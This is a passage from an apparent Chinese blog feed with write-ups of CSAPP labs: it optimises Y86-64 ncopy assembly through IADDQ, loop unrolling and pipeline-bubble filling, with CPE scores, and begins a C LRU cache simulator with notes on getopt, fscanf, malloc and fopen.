testpsimcd ../ptest; make SIM=../pipe/psim TFLAGS=-i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3、保证二者结合正确</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">./correctness.pl -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过了上面的测试，才能保证代码和模拟器都OK。</p><p>使用<code>../misc/yas ncopy.ys</code> 生成ncopy.yo</p><p>使用<code>./check-len.pl &lt; ncopy.yo </code> 检测长度</p><p>使用 <code>unix&gt; make VERSION=full</code> 重建测试环境；</p><p>使用<code>make drivers</code> 生成ncopy.ys的测试程序</p><p>使用 <code>unix&gt; ./psim -t sdriver.yo</code> 和 <code>unix&gt; ./psim -t ldriver.yo</code> 分别测试small 4-element array和larger 63-element array<br>使用 <code>unix&gt; ./correctness.pl</code> 测试 <code>ncopy.ys</code> 代码是否正确；<br>使用 <code>unix&gt; ./benchmark.pl</code> 自动测试得到平均 CPE 。</p><p>最初用给定的代码测试得到平均 CPE 约为 15.18 。这里要拿满分平均 CPE 应在 7.5 以下。</p><h2 id="IADDQ优化"><a href="#IADDQ优化" class="headerlink" title="IADDQ优化"></a>IADDQ优化</h2><p>在hcl中仿照part B增加IADDQ指令，然后再ncopy.ys中把addq都改成IADDQ指令，删除不必要的将立即数放入寄存器的指令，得到CPE为12.7.</p><p>代码大致如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># You can modify this portion# Loop headerxorq %rax,%rax# count &#x3D; 0;andq %rdx,%rdx# len &lt;&#x3D; 0?jle Done# if so, goto Done:Loop:mrmovq (%rdi), %r10# read val from src...rmmovq %r10, (%rsi)# ...and store it to dstandq %r10, %r10# val &lt;&#x3D; 0?jle Npos# if so, goto Npos:iaddq $1, %rax# count++Npos:iaddq $-1, %rdx# len--iaddq $8, %rdi# src++iaddq $8, %rsi# dst++andq %rdx,%rdx# len &gt; 0?jg Loop# if so, goto Loop:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="偷工减料"><a href="#偷工减料" class="headerlink" title="偷工减料"></a>偷工减料</h2><p>我们知道iaddq指令会顺便set_cc，所以可以省掉一个<code>andq %rdx,%rdx</code>指令，把<code>iaddq $-1, %rdx</code>指令移动到<code>jg loop</code>上面。然后跑一遍！</p><p><strong>60opts!!!</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403291338326.png" alt="image-20240329120506890"></p><p>但这是虚假的！用sdrivers测一下就会得到以下结果</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403291338450.png" alt="image-20240329120853674"></p><p>大脑瞬间宕机，思考好一会，发现自己在hcl里面没有对IADDQ改set_cc。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">bool set_cc &#x3D; (E_icode &#x3D;&#x3D; IOPQ|| E_icode&#x3D;&#x3D; IIADDQ) &amp;&amp; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>改完后再次运行。</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403291338505.png" alt="image-20240329121102637"></p><p>喜提零分！</p><blockquote><p>pipe-full.hcl要能过..&#x2F;y86-code 和 ..&#x2F;ptest的测试，尤其是这点，benchmark不检查对错，如果psim有问题，benchmark可能会得到很低的CPE，误以为自己得了满分。</p></blockquote><h2 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h2><h3 id="二路展开"><a href="#二路展开" class="headerlink" title="二路展开"></a>二路展开</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># You can modify this portion# Loop headeriaddq $-2,%rdxjl L0R1Loop1 :mrmovq (%rdi),%r8rmmovq %r8,(%rsi)andq %r8,%r8jle Loop2iaddq $1,%raxLoop2:mrmovq 0x8(%rdi),%r8rmmovq %r8,0x8(%rsi)andq %r8,%r8jle stepiaddq $1,%raxstep:iaddq $0x10,%rdiiaddq $0x10,%rsiiaddq $-2,%rdxjge Loop1L0R1:iaddq $1,%rdxje REM1 retREM1:mrmovq (%rdi),%r8rmmovq %r8,(%rsi)andq %r8,%r8jle Done iaddq $1,%rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Average CPE 9.69</p><p>Score 16.3&#x2F;60.0</p><p>所以我们尝试多路展开，关于对余数的处理，我们可以采取多叉搜索树。</p><h3 id="十路展开"><a href="#十路展开" class="headerlink" title="十路展开"></a>十路展开</h3><p>对于余数[0~9]采取三叉搜索树，即L0R9分为L0R2和3和L4R9,L0R2又分为0，1，2，L4R9又分为L4R6,7,L8R9.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># You can modify this portion# Loop headeriaddq $-10,%rdxjl L0R9Loop1 :mrmovq (%rdi),%r8rmmovq %r8,(%rsi)andq %r8,%r8jle Loop2iaddq $1,%raxLoop2:mrmovq 0x8(%rdi),%r8rmmovq %r8,0x8(%rsi)andq %r8,%r8jle Loop3iaddq $1,%raxLoop3:mrmovq 0x10(%rdi),%r8rmmovq %r8,0x10(%rsi)andq %r8,%r8jle Loop4iaddq $1,%raxLoop4:mrmovq 0x18(%rdi),%r8rmmovq %r8,0x18(%rsi)andq %r8,%r8jle Loop5iaddq $1,%raxLoop5:mrmovq 0x20(%rdi),%r8rmmovq %r8,0x20(%rsi)andq %r8,%r8jle Loop6iaddq $1,%raxLoop6:mrmovq 0x28(%rdi),%r8rmmovq %r8,0x28(%rsi)andq %r8,%r8jle Loop7iaddq $1,%raxLoop7:mrmovq 0x30(%rdi),%r8rmmovq %r8,0x30(%rsi)andq %r8,%r8jle Loop8iaddq $1,%raxLoop8:mrmovq 0x38(%rdi),%r8rmmovq %r8,0x38(%rsi)andq %r8,%r8jle Loop9iaddq $1,%raxLoop9:mrmovq 0x40(%rdi),%r8rmmovq %r8,0x40(%rsi)andq %r8,%r8jle Loop10iaddq $1,%raxLoop10:mrmovq 0x48(%rdi),%r8rmmovq %r8,0x48(%rsi)andq %r8,%r8jle stepiaddq $1,%raxstep:iaddq $0x50,%rdiiaddq $0x50,%rsiiaddq $-10,%rdxjge Loop1# applying range checks to remaindersL0R9:        iaddq   $7,%rdx         # Compare with 3 (len + 10 - 3)        jl      L0R2            # len &lt; 3        jg      L4R9            # len &gt; 3        je      Rem3            # len &#x3D;&#x3D; 3L0R2:        iaddq   $2,%rdx         # Compare with 1 (len + 3 - 1)        je      Rem1            # len &#x3D;&#x3D; 1        jg      Rem2            # len &#x3D;&#x3D; 2        ret                     # len &#x3D;&#x3D; 0L4R6:        iaddq   $2,%rdx         # Compare with 5 (len + 7 - 5)        jl      Rem4            # len &#x3D;&#x3D; 4        je      Rem5            # len &#x3D;&#x3D; 5        jg      Rem6            # len &#x3D;&#x3D; 6L4R9:        iaddq   $-4,%rdx        # Compare with 7 (len + 3 - 7)        jl      L4R6            # len &lt; 7        je      Rem7            # len &#x3D;&#x3D; 7L8R9:        iaddq   $-1,%rdx        # Compare with 8 (len + 7 - 8)        je      Rem8            # len &#x3D;&#x3D; 8# dealing with remaindersRem9:        mrmovq 0x40(%rdi), %r8        rmmovq %r8, 0x40(%rsi)        andq %r8, %r8        jle Rem8        iaddq $1, %raxRem8:        mrmovq 0x38(%rdi), %r8        rmmovq %r8, 0x38(%rsi)        andq %r8, %r8        jle Rem7        iaddq $1, %raxRem7:        mrmovq 0x30(%rdi), %r8        rmmovq %r8, 0x30(%rsi)        andq %r8, %r8        jle Rem6        iaddq $1, %raxRem6:        mrmovq 0x28(%rdi), %r8        rmmovq %r8, 0x28(%rsi)        andq %r8, %r8        jle Rem5        iaddq $1, %raxRem5:        mrmovq 0x20(%rdi), %r8        rmmovq %r8, 0x20(%rsi)        andq %r8, %r8        jle Rem4        iaddq $1, %raxRem4:        mrmovq 0x18(%rdi), %r8        rmmovq %r8, 0x18(%rsi)        andq %r8, %r8        jle Rem3        iaddq $1, %raxRem3:        mrmovq 0x10(%rdi), %r8        rmmovq %r8, 0x10(%rsi)        andq %r8, %r8        jle Rem2        iaddq $1, %raxRem2:        mrmovq 0x8(%rdi), %r8        rmmovq %r8, 0x8(%rsi)        andq %r8, %r8        jle Rem1        iaddq $1, %raxRem1:        mrmovq (%rdi), %r8        rmmovq %r8, (%rsi)        andq %r8, %r8        jle Done        iaddq $1, %rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ncopy length &#x3D; 988 bytes</strong></p><p><strong>Average CPE 8.39</strong></p><p><strong>Score 42.3&#x2F;60.0</strong></p><h2 id="戳气泡"><a href="#戳气泡" class="headerlink" title="戳气泡"></a>戳气泡</h2><p><code>Y86-64</code>处理器的流水线有 F(取指)、D(译码)、E(执行)、M(访存)、W(写回) 五个阶段，D 阶段才读取寄存器，M 阶段才读取对应内存值，注意我们在十路展开里面有大量的mr和rm对同一个寄存器进行操作，在中间有空余bubble，可以考虑用多个寄存器来存，来利用其中的bubble空余时间，代码如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># You can modify this portion# Loop headeriaddq $-10,%rdxjl L0R9Loop10:                #取值mrmovq (%rdi),%r8                mrmovq 0x8(%rdi),%r9                mrmovq 0x10(%rdi),%r10                mrmovq 0x18(%rdi),%r11                mrmovq 0x20(%rdi),%r12                mrmovq 0x28(%rdi),%r13                mrmovq 0x30(%rdi),%r14                mrmovq 0x38(%rdi),%rcx                mrmovq 0x40(%rdi),%rbx                mrmovq 0x48(%rdi),%rbp                #写值rmmovq %r8,(%rsi)                rmmovq %r9,0x8(%rsi)                rmmovq %r10,0x10(%rsi)                rmmovq %r11,0x18(%rsi)                rmmovq %r12,0x20(%rsi)                rmmovq %r13,0x28(%rsi)                rmmovq %r14,0x30(%rsi)                rmmovq %rcx,0x38(%rsi)                rmmovq %rbx,0x40(%rsi)                rmmovq %rbp,0x48(%rsi)                #先判断一下andq %r8,%r8jle judge0iaddq $1,%raxjudge0:andq %r9,%r9jle judge1iaddq $1,%raxjudge1:andq %r10,%r10jle judge2iaddq $1,%raxjudge2:andq %r11,%r11jle judge3iaddq $1,%raxjudge3:andq %r12,%r12jle judge4iaddq $1,%raxjudge4:andq %r13,%r13jle judge5iaddq $1,%raxjudge5:andq %r14,%r14jle judge6iaddq $1,%raxjudge6:andq %rcx,%rcxjle judge7iaddq $1,%raxjudge7:andq %rbx,%rbxjle judge8iaddq $1,%raxjudge8:andq %rbp,%rbpjle stepiaddq $1,%raxstep:iaddq $0x50,%rdiiaddq $0x50,%rsiiaddq $-10,%rdxjge Loop10# applying range checks to remaindersL0R9:        iaddq   $7,%rdx         # Compare with 3 (len + 10 - 3)        jl      L0R2            # len &lt; 3        jg      L4R9            # len &gt; 3        je      Rem3            # len &#x3D;&#x3D; 3L0R2:        iaddq   $2,%rdx         # Compare with 1 (len + 3 - 1)        je      Rem1            # len &#x3D;&#x3D; 1        jg      Rem2            # len &#x3D;&#x3D; 2        ret                     # len &#x3D;&#x3D; 0L4R6:        iaddq   $2,%rdx         # Compare with 5 (len + 7 - 5)        jl      Rem4            # len &#x3D;&#x3D; 4        je      Rem5            # len &#x3D;&#x3D; 5        jg      Rem6            # len &#x3D;&#x3D; 6L4R9:        iaddq   $-4,%rdx        # Compare with 7 (len + 3 - 7)        jl      L4R6            # len &lt; 7        je      Rem7            # len &#x3D;&#x3D; 7L8R9:        iaddq   $-1,%rdx        # Compare with 8 (len + 7 - 8)        je      Rem8            # len &#x3D;&#x3D; 8# dealing with remaindersRem9:        mrmovq 0x40(%rdi), %r8        rmmovq %r8, 0x40(%rsi)        andq %r8, %r8        jle Rem8        iaddq $1, %raxRem8:        mrmovq 0x38(%rdi), %r8        rmmovq %r8, 0x38(%rsi)        andq %r8, %r8        jle Rem7        iaddq $1, %raxRem7:        mrmovq 0x30(%rdi), %r8        rmmovq %r8, 0x30(%rsi)        andq %r8, %r8        jle Rem6        iaddq $1, %raxRem6:        mrmovq 0x28(%rdi), %r8        rmmovq %r8, 0x28(%rsi)        andq %r8, %r8        jle Rem5        iaddq $1, %raxRem5:        mrmovq 0x20(%rdi), %r8        rmmovq %r8, 0x20(%rsi)        andq %r8, %r8        jle Rem4        iaddq $1, %raxRem4:        mrmovq 0x18(%rdi), %r8        rmmovq %r8, 0x18(%rsi)        andq %r8, %r8        jle Rem3        iaddq $1, %raxRem3:        mrmovq 0x10(%rdi), %r8        rmmovq %r8, 0x10(%rsi)        andq %r8, %r8        jle Rem2        iaddq $1, %raxRem2:        mrmovq 0x8(%rdi), %r8        rmmovq %r8, 0x8(%rsi)        andq %r8, %r8        jle Rem1        iaddq $1, %raxRem1:        mrmovq (%rdi), %r8        rmmovq %r8, (%rsi)        andq %r8, %r8        jle Done        iaddq $1, %rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ncopy length &#x3D; 988 bytes</p><p>Average CPE     7.65<br>Score   57.1&#x2F;60.0</p><p>最后得分:<strong>57.1</strong>差不多就这样吧.</p><h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><p>这个lab做的挺草率的，书都没怎么看，几乎算是面向题目的学习，lab的难度也确实不高，最后partc就以57.1分收尾了，以后想折腾以后的事，感觉还是有不少能戳气泡，调整的空间，但现在3月29号，要去做字符串，图论，备战校赛了，lab先搁浅搁浅。累的时候再做做emmmm</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP的lab5-cachelab</title>
      <link href="/2024/03/10/lab5/"/>
      <url>/2024/03/10/lab5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前前后后看了一个星期的关于optimization programmer 和cache 方面的知识,虽然没有打开课本,但想直接做做,课本属实有点厚,主要是想快刀斩乱麻</p><p>太难啦!!!!</p></blockquote><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><h2 id="Rules-and-Tips"><a href="#Rules-and-Tips" class="headerlink" title="Rules and Tips"></a>Rules and Tips</h2><blockquote><p><a href="http://csapp.cs.cmu.edu/3e/cachelab.pdf">WriteUp</a>，本lab的规则与评分标准。<br><a href="https://www.cs.cmu.edu/afs/cs/academic/class/15213-f15/www/recitations/rec07.pdf">书本内容及实验</a>，这个ppt其实非常好，回顾了书本上的内容，对实验部分也给予了一定的引导作用。<br><a href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">分块技术</a>，CMU早年的一篇文章，配合Lab食用体验更佳。</p></blockquote><h2 id="小函数"><a href="#小函数" class="headerlink" title="小函数"></a>小函数</h2><ul><li><p><a href="https://blog.csdn.net/afei__/article/details/81261879">getopt用法</a>,能在给定的命令参数中挑出选项,识别不同种类的参数</p></li><li><p><a href="https://www.cnblogs.com/yaya12138/p/11329319.html">fscanf用法</a>,能在包含大量相同格式的文件中,分别读出每一个字符</p></li></ul><p>函数原型：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">Copyint <span class="token function">fscanf</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span> fp<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span> format<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中fp为文件指针，format为C字符串，…为参数列表，返回值为成功写入的字符的个数。</p><p>fscanf函数会从文件输入流中读入数据，存储到format中，<strong>遇到空格和换行时结束</strong>。</p><p>例如本文</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%c %xu,%d\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>operation<span class="token punctuation">,</span> <span class="token operator">&amp;</span>address<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>能从fp对应的文件中每一行读取一个字符存到operation,读取一个16进制无符号整数存到Address,读取一个整数存到Size</p><ul><li><a href="https://www.runoob.com/cprogramming/c-function-malloc.html">malloc用法</a>,能开辟空间</li></ul><p>函数声明</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回值:</p><p>该函数返回一个指针,指向已分配大小的内存。如果请求失败,则返回NULL。</p><p>例如本文:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">cache_ <span class="token operator">=</span> <span class="token punctuation">(</span>cache<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>cache_f<span class="token punctuation">)</span> <span class="token operator">*</span> S<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回的指针无类型,需要自己规定类型.</p><ul><li><a href="https://www.runoob.com/cprogramming/c-function-fopen.html">fopen用法</a>: 定位文件(通过路径),以指针的形式访问文件</li></ul><p>函数声明</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">FILE <span class="token operator">*</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>mode<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如本文</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">FILE <span class="token operator">*</span>fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fuck you Open error!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Cache寻址"><a href="#Cache寻址" class="headerlink" title="Cache寻址"></a>Cache寻址</h2><p>缓存长什么样?</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023552.png" alt="image-20240312163438221"></p><p>故缓存中的每个Cache_line由Valid_bits和Tag和Block构成,每个Set由有多个E,每个E有多个line.具体可以看视频,要是看不懂的话,可以看<a href="https://www.bilibili.com/video/BV1iW411d7hd?p=12">课程视频</a>.</p><p>相信你现在懂了,那我们再看看怎么寻址吧!</p><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403122023597.png" alt="image-20240312163819510"></p><p>每一个内存对缓存的映射大都符合这种情况,有一个tag,有一个set index,有一个Block offset.了解了解就可以开始做题了!</p><p><strong>希望上面的每个链接你都能细致的看完,不然的话就要像我一样没有完备的知识架构体系而不断的上网查资料了,这就是精华!!!</strong></p><h1 id="Part-1-LRU-Cache"><a href="#Part-1-LRU-Cache" class="headerlink" title="Part 1 LRU Cache"></a>Part 1 LRU Cache</h1><p>目的:在给定的csim.c文件中编写填充,实现一个基于LRU策略的Cache simulator,该模拟器可以模拟在一系列的数据访问中cache的hit、miss与eviction的情况，其中，需要eviction行时，用LRU替换策略进行替换。</p><p>cache模拟器需要能处理一系列如下的命令：</p><pre><code>Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</code></pre><p>​    其中各参数意义如下：</p><ol><li><p>-h：输出帮助信息的选项；</p></li><li><p>-v：输出详细运行过程信息的选项；</p></li><li><p>-s：组索引的位数(意味着组数S&#x3D;2^s^)；</p></li><li><p>-E：每一组包含的行数；</p></li><li><p>-b：偏移位的宽度(意味着块的大小为B&#x3D;2^b^);</p></li><li><p>-t：输入数据文件的路径(测试数据从该文件里面读取)。</p></li></ol><p>———————————————</p><p><strong>接下来分别讲解每个函数的思路和代码实现:</strong></p><h2 id="sf"><a href="#sf" class="headerlink" title="sf"></a>sf</h2><p>在这个函数里面我要做的是把输入的,在命令行中的参数全部提取出来,这里采取的是getopt函数(注意加上他的头文件),要是你学会了他的用法那就不难了,opt会依次获取每一个选项<code>h,v,s,E,b,t</code>要是有就会读入,要是有冒号的话还会读入后面的参数,存在optarg中,通过atoi函数可以直接将字符串转换成整数!完美解决第一个小函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sf</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    h <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> opt<span class="token punctuation">;</span>    <span class="token comment">// 拆分输入的规定</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>opt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">getopt</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token string">"hvs:E:b:t:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>opt<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token char">'h'</span><span class="token operator">:</span>                h <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token char">'v'</span><span class="token operator">:</span>                v <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token char">'s'</span><span class="token operator">:</span>                s <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token char">'E'</span><span class="token operator">:</span>                E <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token char">'b'</span><span class="token operator">:</span>                b <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token char">'t'</span><span class="token operator">:</span>                <span class="token function">strcpy</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token operator">:</span>                <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> E <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> b <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> t <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    S <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PrintUsage"><a href="#PrintUsage" class="headerlink" title="PrintUsage"></a>PrintUsage</h2><p>这个函数可要可不要,我随便写的</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fuck you Vite ,Do it quickly ,Don't play game! OK?\n"</span>           <span class="token string">"Usage: ./csim-ref [-hv] -s &lt;num> -E &lt;num> -b &lt;num> -t &lt;file>\n"</span>           <span class="token string">"Options:\n"</span>           <span class="token string">"  -h         Print this help message.\n"</span>           <span class="token string">"  -v         Optional verbose flag.\n"</span>           <span class="token string">"  -s &lt;num>   Number of set index bits.\n"</span>           <span class="token string">"  -E &lt;num>   Number of lines per set.\n"</span>           <span class="token string">"  -b &lt;num>   Number of block offset bits.\n"</span>           <span class="token string">"  -t &lt;file>  Trace file.\n\n"</span>           <span class="token string">"Examples:\n"</span>           <span class="token string">"  linux>  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\n"</span>           <span class="token string">"  linux>  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="init-Cache"><a href="#init-Cache" class="headerlink" 